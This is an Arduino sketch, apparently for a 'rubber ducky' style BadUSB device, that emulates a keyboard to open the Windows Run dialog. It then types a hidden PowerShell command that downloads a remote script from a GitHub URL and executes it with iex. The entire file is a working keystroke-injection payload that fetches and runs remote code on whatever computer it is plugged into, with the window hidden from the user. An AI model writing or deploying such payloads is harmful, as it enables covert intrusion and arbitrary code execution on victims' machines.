/* Copyright (c) 2017 Andrea Fioraldi
 *
 * License http://opensource.org/licenses/mit-license.php MIT License
 */

#include "HID-Project.h"

void setup() {
  delay(500);
  Keyboard.begin();
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  
  Keyboard.println(F("powershell -windowstyle hidden iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andreafioraldi/UnoRubber/master/powershell_payload.ps1')"));
}

void loop() {}
